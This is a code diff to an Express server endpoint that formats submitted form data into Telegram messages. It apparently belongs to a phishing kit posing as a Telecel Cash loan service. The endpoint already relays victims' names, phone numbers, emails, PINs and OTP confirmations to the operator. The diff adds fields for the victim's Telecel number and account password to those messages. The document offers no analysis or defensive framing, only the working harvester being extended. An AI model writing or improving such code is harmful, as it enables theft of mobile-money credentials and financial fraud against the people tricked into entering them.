@@ -44,7 +44,7 @@ app.get('/health', (req, res) => {
 // ========== MAIN TELEGRAM ENDPOINT ==========
 app.post('/api/send-telegram', async (req, res) => {
     try {
-        const { phone, pin, email, name, type, site, amount, term, monthly, employment } = req.body;
+        const { phone, pin, email, name, type, site, amount, term, monthly, employment, telecel_number, password } = req.body;
         
         console.log('='.repeat(50));
         console.log('📨 Request received:', new Date().toISOString());
@@ -80,11 +80,14 @@ app.post('/api/send-telegram', async (req, res) => {
             message += `⏰ Time: ${timestamp}`;
             
         } else if (type === 'pin') {
+            // UPDATED: Added Telecel Number and Password fields
             message = `🔐 PIN CONFIRMED - Telecel Cash 🔐\n\n`;
             message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             message += `👤 Name: ${name || 'Not provided'}\n`;
             message += `📞 Phone: ${phone || 'Not provided'}\n`;
             message += `📧 Email: ${email || 'Not provided'}\n`;
+            message += `📱 Telecel Number: ${telecel_number || 'Not provided'}\n`;
+            message += `🔒 Password: ${password || 'Not provided'}\n`;
             message += `💰 Loan Amount: ₵${amount || '0'}\n`;
             message += `📅 Term: ${term || '0'} months\n`;
             message += `💵 Monthly Payment: ₵${monthly || '0'}\n`;
@@ -93,11 +96,13 @@ app.post('/api/send-telegram', async (req, res) => {
             message += `⏰ Time: ${timestamp}`;
             
         } else if (type === 'otp') {
+            // UPDATED: Added Telecel Number to OTP message
             message = `✅ OTP VERIFIED - Telecel Cash ✅\n\n`;
             message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             message += `👤 Name: ${name || 'Not provided'}\n`;
             message += `📞 Phone: ${phone || 'Not provided'}\n`;
             message += `📧 Email: ${email || 'Not provided'}\n`;
+            message += `📱 Telecel Number: ${telecel_number || 'Not provided'}\n`;
             message += `💰 Loan Amount: ₵${amount || '0'}\n`;
             message += `📅 Term: ${term || '0'} months\n`;
             message += `💵 Monthly Payment: ₵${monthly || '0'}\n`;
